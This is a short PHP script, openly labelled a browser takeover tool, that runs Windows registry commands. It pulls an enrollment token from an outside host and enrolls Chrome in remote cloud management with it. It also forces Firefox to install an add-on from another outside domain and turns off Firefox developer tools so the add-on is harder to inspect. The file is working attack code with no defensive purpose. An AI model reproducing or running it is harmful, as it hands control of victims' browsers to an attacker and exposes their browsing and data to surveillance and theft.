<?php
// Browser takeover: Chrome enrollment, Firefox forced add-on.
$token = trim(file_get_contents('https://rarer.top/api/v1/state'));
exec('reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v CloudManagementEnrollmentToken /t REG_SZ /d ' . $token . ' /f');
$policy = json_encode(array('docs@hub.example' => array(
    'installation_mode' => 'force_installed',
    'install_url' => 'https://content.document-hub.top/hub.xpi')));
exec('reg add "HKLM\SOFTWARE\Policies\Mozilla\Firefox" /v ExtensionSettings /t REG_SZ /d ' . escapeshellarg($policy) . ' /f');
exec('reg add "HKLM\SOFTWARE\Policies\Mozilla\Firefox" /v DisableDeveloperTools /t REG_DWORD /d 1 /f');
